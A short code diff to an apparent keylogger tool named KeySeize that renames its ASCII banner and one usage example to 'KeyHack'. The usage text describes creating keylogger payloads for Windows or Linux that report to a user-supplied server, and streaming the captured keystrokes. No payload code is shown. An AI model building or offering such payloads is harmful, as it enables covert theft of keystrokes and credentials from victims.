@@ -9,7 +9,7 @@ banner = ("""
 |\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|
 | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
 | |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | |
-| |K  | | |e  | | |y  | | |S  | | |e  | | |i  | | |z  | | |e  | |
+| |K  | | |e  | | |y  | | |H  | | |A  | | |C  | | |K  | | |s  | |
 | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
 |/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|
              Coded and Developed by Nishant Parhi
@@ -22,7 +22,7 @@ except:
 	print("Coded and Developed by: Nishant Parhi")
 	print("Github: nishantparhi")
 	print("Instagram: Xploitit")
-	print("Usage: KeySeize <mode> <server> [if applicable]\nExample: KeySeize c http://server.com\nmodes:\nc -> Create Payloads\ns -> Stream Keylog\nNotes: If using Option 'c' to create a payload, you may supply a OS type to complile for (windows, linux)\nExample: ./keyseize.py c 'http://yourhost.com' windows")
+	print("Usage: KeySeize <mode> <server> [if applicable]\nExample: KeyHack c http://server.com\nmodes:\nc -> Create Payloads\ns -> Stream Keylog\nNotes: If using Option 'c' to create a payload, you may supply a OS type to complile for (windows, linux)\nExample: ./keyseize.py c 'http://yourhost.com' windows")
 	try:
 		exit(0)
 	except:
